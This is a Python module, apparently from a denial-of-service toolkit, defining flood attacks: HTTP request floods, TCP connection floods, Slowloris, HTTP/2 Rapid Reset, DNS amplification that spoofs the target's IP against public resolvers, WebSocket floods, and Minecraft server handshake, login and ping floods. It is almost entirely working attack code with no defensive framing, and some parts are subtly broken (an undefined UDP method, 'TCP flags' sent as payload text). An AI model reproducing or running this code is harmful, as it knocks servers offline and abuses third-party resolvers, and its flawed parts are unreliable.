import socket
import random
import string
import asyncio
import aiohttp
import h2.config
import h2.connection
from typing import Optional, Dict, List
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime, timedelta
from scapy.all import IP, TCP, UDP, ICMP, send
from .utilities import NetworkUtilities, Endpoint, _decode_str
from .logger import getLogger

logger = getLogger("Flood")


class BaseFlood:
    def __init__(self, endpoint, duration: int):
        self.endpoint = endpoint
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)

    def _is_expired(self) -> bool:
        return (self.until - datetime.now()).total_seconds() <= 0


class L7Async:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._session: Optional[aiohttp.ClientSession] = None

    def _generate_data_content(self, length: int = 256) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            timeout = aiohttp.ClientTimeout(total=10, connect=5)
            connector = aiohttp.TCPConnector(limit=0, limit_per_host=100)
            self._session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self._session

    async def _send_request(self, method: str) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                session = await self._get_session()
                url = f"{self.endpoint.scheme}://{self.endpoint.host}:{self.endpoint.port}{self.endpoint.path}"

                headers = {
                    "User-Agent": self.net_tools.random_user_agent(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                }

                if method in ("POST", "PUT"):
                    body = self._generate_data_content(256)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    headers["Content-Length"] = str(len(body))
                else:
                    body = None

                async with session.request(
                    method, url, headers=headers, data=body, ssl=False
                ) as resp:
                    await resp.read()

            except asyncio.TimeoutError:
                logger.debug("L7 request timeout")
            except aiohttp.ClientError:
                logger.debug("L7 client error")
            except Exception:
                logger.debug("L7 unexpected error")

            if (self.until - datetime.now()).total_seconds() <= 0:
                break
            await asyncio.sleep(0.01)

    async def close(self) -> None:
        if self._session and not self._session.closed:
            await self._session.close()

    def GET(self) -> None:
        asyncio.create_task(self._send_request("GET"))

    def POST(self) -> None:
        asyncio.create_task(self._send_request("POST"))

    def PUT(self) -> None:
        asyncio.create_task(self._send_request("PUT"))

    def DELETE(self) -> None:
        asyncio.create_task(self._send_request("DELETE"))

    def HEAD(self) -> None:
        asyncio.create_task(self._send_request("HEAD"))


class L4Async:
    def __init__(self, endpoint, duration: int):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _send_tcp_async(self, flags: str = None) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port
                )
                if flags:
                    writer.write(flags.encode())
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                logger.debug("L4 TCP send failed")

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def ACK(self) -> None:
        self._run_async(self._send_tcp_async("A"))

    def SYN(self) -> None:
        self._run_async(self._send_tcp_async("S"))

    def FIN(self) -> None:
        self._run_async(self._send_tcp_async("F"))

    def RST(self) -> None:
        self._run_async(self._send_tcp_async("R"))

    def TCP(self) -> None:
        self._run_async(self._send_tcp_async())

    def UDP(self, message: bytes = b"hello") -> None:
        self._run_async(self._send_udp_async(message))

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class Slowloris:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []
        self._sockets: List[socket.socket] = []

    def _generate_headers(self) -> bytes:
        host = self.endpoint.host
        port = self.endpoint.port
        headers = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {self.net_tools.random_user_agent()}\r\n"
            f"Accept: */*\r\n"
            f"X-A: "
        )
        return headers.encode()

    async def _send_slowloris(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sockets.append(sock)
        try:
            sock.settimeout(5)
            await asyncio.get_event_loop().sock_connect(
                sock, (self.endpoint.host, self.endpoint.port)
            )

            headers = self._generate_headers()
            await asyncio.get_event_loop().sock_sendall(sock, headers)

            while (self.until - datetime.now()).total_seconds() > 0:
                try:
                    await asyncio.sleep(10)
                    partial = (
                        b"X-Keep-Alive: "
                        + str(random.randint(1, 9999)).encode()
                        + b"\r\n"
                    )
                    await asyncio.get_event_loop().sock_sendall(sock, partial)
                except Exception:
                    logger.debug("Slowloris keep-alive failed")
                    break
        except Exception:
            logger.debug("Slowloris connection error")
        finally:
            try:
                sock.close()
            except Exception:
                logger.debug("Slowloris socket close error")

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._send_slowloris())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)
        for sock in self._sockets:
            try:
                sock.close()
            except Exception:
                pass


class H2RapidReset:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _rapid_reset_raw(self) -> None:
        import ssl

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port, ssl=ssl_ctx
                )

                http2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
                writer.write(http2_preface)
                await writer.drain()

                conn = h2.connection.H2Connection(
                    config=h2.config.H2Configuration(client_side=True)
                )
                conn.initiate_connection()
                writer.write(conn.data_to_send())
                await writer.drain()

                conn.send_headers(
                    1,
                    [
                        (b":method", b"GET"),
                        (b":path", b"/"),
                        (b":scheme", b"https"),
                        (
                            b":authority",
                            f"{self.endpoint.host}:{self.endpoint.port}".encode(),
                        ),
                    ],
                )
                conn.reset_stream(1)

                data = conn.data_to_send()
                if data:
                    writer.write(data)
                    await writer.drain()

                writer.close()
                await writer.wait_closed()
            except Exception:
                logger.debug("H2 reset error")

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._rapid_reset_raw())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class DNSAmplification:
    def __init__(self, target_host: str, target_port: int = 53, duration: int = 30):
        self.target_host = target_host
        self.target_port = target_port
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

        self._resolvers = [
            ("8.8.8.8", 53),
            ("1.1.1.1", 53),
            ("9.9.9.9", 53),
            ("208.67.222.222", 53),
        ]

    async def _send_dns_amp(self) -> None:
        from scapy.all import IP, UDP, DNS, DNSQR, send

        query_type = random.choice(["A", "AAAA", "MX", "TXT", "CNAME"])
        domain = f"{random.randint(1, 999999)}.example.com"

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                resolver_ip, resolver_port = random.choice(self._resolvers)

                pkt = (
                    IP(src=self.target_host, dst=resolver_ip)
                    / UDP(sport=random.randint(1024, 65535), dport=resolver_port)
                    / DNS(rd=1, qd=DNSQR(qname=domain, qtype=query_type))
                )
                send(pkt, verbose=0)
            except Exception:
                logger.debug("DNS amp send failed")

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._send_dns_amp())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class WebSocketFlood:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)
        self._tasks: List[asyncio.Task] = []

    async def _ws_flood(self) -> None:
        import aiohttp

        while (self.until - datetime.now()).total_seconds() > 0:
            try:
                ws_url = f"ws://{self.endpoint.host}:{self.endpoint.port}/ws"
                async with aiohttp.ClientSession() as session:
                    async with session.ws_connect(ws_url, timeout=5) as ws:
                        for _ in range(10):
                            if (self.until - datetime.now()).total_seconds() <= 0:
                                break
                            msg = self.net_tools._generate_data_content(256)
                            await ws.send_str(msg)
                            await asyncio.sleep(0.1)
            except Exception:
                logger.debug("WS flood error")

    def _run_async(self, coro) -> None:
        task = asyncio.create_task(coro)
        self._tasks.append(task)

    def start(self) -> None:
        self._run_async(self._ws_flood())

    async def wait_done(self) -> None:
        await asyncio.gather(*self._tasks, return_exceptions=True)


class MinecraftProtocol:
    PROTOCOL_VERSION = 774

    @staticmethod
    def _varint(value: int) -> bytes:
        result = b""
        while True:
            byte = (value & 0x7F) | (0x80 if value > 0x7F else 0)
            result += bytes([byte])
            value >>= 7
            if value == 0:
                break
        return result

    def _create_handshake_packet(self, next_state: int) -> bytes:
        packet_id = self._varint(0x00)
        protocol_version = self._varint(self.PROTOCOL_VERSION)
        server_address = self.endpoint.host.encode("utf-8")
        server_port = self.endpoint.port.to_bytes(2, "big")
        next_state_varint = self._varint(next_state)

        data = (
            protocol_version
            + self._varint(len(server_address))
            + server_address
            + server_port
            + next_state_varint
        )
        payload = packet_id + data
        return self._varint(len(payload)) + payload


class MinecraftHandshakeFlood(MinecraftProtocol, BaseFlood):
    def __init__(self, endpoint, duration: int = 30):
        BaseFlood.__init__(self, endpoint, duration)
        self.endpoint = endpoint

    async def _handshake_flood(self) -> None:
        while not self._is_expired():
            try:
                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port
                )
                packet = self._create_handshake_packet(1)
                writer.write(packet)
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                logger.debug("MC handshake failed")

    def start(self) -> None:
        self._run_async(self._handshake_flood())


class MinecraftLoginFlood(MinecraftProtocol, BaseFlood):
    def __init__(self, endpoint, duration: int = 30, username: str = None):
        BaseFlood.__init__(self, endpoint, duration)
        self.endpoint = endpoint
        self.base_username = username or "Player"

    def _create_login_start_packet(self, username: str) -> bytes:
        packet_id = self._varint(0x00)
        username_bytes = username.encode("utf-8")
        uuid_bytes = b"\x00" * 16
        data = self._varint(len(username_bytes)) + username_bytes + uuid_bytes
        payload = packet_id + data
        return self._varint(len(payload)) + payload

    def _create_chat_packet(self, message: str) -> bytes:
        packet_id = self._varint(0x05)
        message_bytes = message.encode("utf-8")
        data = self._varint(len(message_bytes)) + message_bytes
        payload = packet_id + data
        return self._varint(len(payload)) + payload

    def _create_keepalive_packet(self, keepalive_id: int) -> bytes:
        packet_id = self._varint(0x11)
        data = keepalive_id.to_bytes(8, "big")
        payload = packet_id + data
        return self._varint(len(payload)) + payload

    async def _login_flood(self) -> None:
        while not self._is_expired():
            try:
                username = f"{self.base_username}{random.randint(1, 99999)}"
                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port
                )

                handshake = self._create_handshake_packet(2)
                writer.write(handshake)
                await writer.drain()

                await asyncio.sleep(0.1)

                login_start = self._create_login_start_packet(username)
                writer.write(login_start)
                await writer.drain()

                login_success = False
                keepalive_id = random.randint(1, 999999999)
                last_keepalive = datetime.now()

                while not self._is_expired():
                    try:
                        async with asyncio.timeout(1):
                            length_bytes = await reader.read(1)
                            if not length_bytes:
                                break

                            length = int.from_bytes(length_bytes, "big")
                            if length > 127:
                                extra = await reader.read(1)
                                length = int.from_bytes(length_bytes + extra, "big")

                            packet_data = await reader.read(length)

                            if len(packet_data) > 0:
                                packet_id = int.from_bytes(packet_data[:1], "big")

                                if packet_id == 0x02:
                                    login_success = True

                                elif packet_id == 0x1F:
                                    keepalive_id = int.from_bytes(
                                        packet_data[1:9], "big"
                                    )
                                    keepalive_response = self._create_keepalive_packet(
                                        keepalive_id
                                    )
                                    writer.write(keepalive_response)
                                    await writer.drain()
                                    last_keepalive = datetime.now()

                    except asyncio.TimeoutError:
                        if (
                            login_success
                            and (datetime.now() - last_keepalive).total_seconds() > 10
                        ):
                            keepalive_response = self._create_keepalive_packet(
                                keepalive_id
                            )
                            writer.write(keepalive_response)
                            await writer.drain()
                            last_keepalive = datetime.now()
                    except Exception:
                        break

                writer.close()
                await writer.wait_closed()
            except Exception:
                logger.debug("MC login failed")

    def start(self) -> None:
        self._run_async(self._login_flood())


class MinecraftPingFlood(MinecraftProtocol, BaseFlood):
    def __init__(self, endpoint, duration: int = 30):
        BaseFlood.__init__(self, endpoint, duration)
        self.endpoint = endpoint

    def _create_status_request_packet(self) -> bytes:
        packet_id = self._varint(0x00)
        data = b""
        payload = packet_id + data
        return self._varint(len(payload)) + payload

    def _create_ping_packet(self, timestamp: int) -> bytes:
        packet_id = self._varint(0x01)
        data = timestamp.to_bytes(8, "big")
        payload = packet_id + data
        return self._varint(len(payload)) + payload

    async def _ping_flood(self) -> None:
        while not self._is_expired():
            try:
                reader, writer = await asyncio.open_connection(
                    self.endpoint.host, self.endpoint.port
                )
                packet = self._create_handshake_packet(1)
                writer.write(packet)
                await writer.drain()

                await asyncio.sleep(0.1)

                status_request = self._create_status_request_packet()
                writer.write(status_request)
                await writer.drain()

                await asyncio.sleep(0.1)

                ping = self._create_ping_packet(random.randint(1, 999999))
                writer.write(ping)
                await writer.drain()

                await asyncio.sleep(0.3)
                writer.close()
                await writer.wait_closed()
            except Exception:
                logger.debug("MC ping failed")

    def start(self) -> None:
        self._run_async(self._ping_flood())
